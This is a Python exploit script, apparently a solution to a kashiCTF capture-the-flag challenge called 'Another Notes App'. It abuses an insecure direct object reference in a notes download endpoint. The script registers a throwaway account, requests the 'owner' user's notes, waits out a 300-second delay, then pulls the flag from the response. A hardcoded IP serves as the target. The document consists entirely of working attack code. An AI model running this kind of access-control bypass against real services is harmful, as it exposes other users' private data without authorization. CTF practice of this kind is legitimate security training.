#!/usr/bin/env python3
"""
Another Notes App — IDOR in /notes/request-download
The endpoint accepts any username and returns that user's notes after 300s wait.
Flag is in owner's notes.
"""
import requests
import sys
import time
import random
import string

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://34.126.223.46:17831"
s = requests.Session()

# 1. Register a random user
user = "exploit_" + ''.join(random.choices(string.ascii_lowercase, k=6))
pwd = "password123"

print(f"[*] Registering user: {user}")
r = s.post(f"{BASE}/register", data={"username": user, "password": pwd}, allow_redirects=False)
print(f"    Status: {r.status_code}, Location: {r.headers.get('Location','')}")

# Follow redirect to /notes to confirm login
r = s.get(f"{BASE}/notes")
if "Welcome" in r.text:
    print(f"[+] Logged in successfully")
else:
    print(f"[-] Login may have failed")
    # Try explicit login
    r = s.post(f"{BASE}/login", data={"username": user, "password": pwd}, allow_redirects=False)
    r = s.get(f"{BASE}/notes")

# 2. Request download for owner
print(f"[*] Requesting download for 'owner'...")
r = s.post(f"{BASE}/notes/request-download", data={"username": "owner"})
print(f"    Response: {r.text[:200]}")

# 3. Wait 300 seconds
print(f"[*] Waiting 300 seconds for download permission...")
for i in range(300, 0, -30):
    print(f"    {i}s remaining...", flush=True)
    time.sleep(30)

# 4. Fetch owner's notes
print(f"[*] Fetching owner's notes...")
r = s.post(f"{BASE}/notes/request-download", data={"username": "owner"})
print(f"[+] Response:\n{r.text}")

if "kashiCTF{" in r.text:
    import re
    flag = re.search(r'kashiCTF\{[^}]+\}', r.text).group()
    print(f"\n[FLAG] {flag}")
